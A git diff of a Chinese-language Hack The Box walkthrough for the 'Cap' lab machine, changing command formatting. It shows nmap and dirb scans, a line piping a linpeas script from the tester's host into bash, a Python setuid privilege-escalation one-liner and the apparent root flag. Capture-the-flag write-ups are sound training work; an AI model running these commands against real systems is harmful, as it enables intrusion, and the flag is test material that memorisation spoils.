@@ -14,13 +14,13 @@ https://app.hackthebox.com/machines/Cap
  <img width="676" height="191" alt="image" src="https://github.com/user-attachments/assets/7e0b00b7-89d1-427f-bd8e-0440a2a3a298" />
 
 2.	對靶機進行掃描，並將確認有開啟的Port放入ports變數
-ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
-echo $ports
+`ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+echo $ports`
 
  <img width="673" height="74" alt="image" src="https://github.com/user-attachments/assets/f6671547-961f-46f0-9193-a7170adc371b" />
 
 3.	掃描上個步驟所找到的Port，並查訊更詳細的資料，並存放到cap.txt
-nmap -p$ports -Pn -sC -sV -A --script vuln -oN cap.txt 10.10.10.245
+`nmap -p$ports -Pn -sC -sV -A --script vuln -oN cap.txt 10.10.10.245`
 
  <img width="718" height="161" alt="image" src="https://github.com/user-attachments/assets/9a00f37d-b14a-43b5-9b36-a6c17e6651bc" />
 
@@ -37,7 +37,7 @@ nmap -p$ports -Pn -sC -sV -A --script vuln -oN cap.txt 10.10.10.245
 <img width="519" height="201" alt="image" src="https://github.com/user-attachments/assets/aaedc588-839a-4efd-bfa0-7f12b81352f2" />
 
 7.	利用dirb 檢視這個系統有哪些目錄，在此有看到跟封包紀錄有關的目錄data。
-dirb http://10.10.10.245
+`dirb http://10.10.10.245`
 
  <img width="403" height="379" alt="image" src="https://github.com/user-attachments/assets/2354e7f2-1f7c-4b67-bfbb-c7dcb1632fd1" />
 
@@ -92,7 +92,9 @@ curl http://10.10.14.29/linpeas.sh | bash > check.txt
  <img width="637" height="93" alt="image" src="https://github.com/user-attachments/assets/84c35daa-e3f5-4823-a3a5-a5ab9a4aef89" />
 
 19.	下載並執行linpeas.sh，可以看到LinPEAS.sh列出可用的漏洞。直接執行 Python 指令就可以提升權限，提升權限後，印出root.txt。
+```
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id && whoami
 
 **12bfd933b27aadc7948d94fc6ab2d1ac**
+```
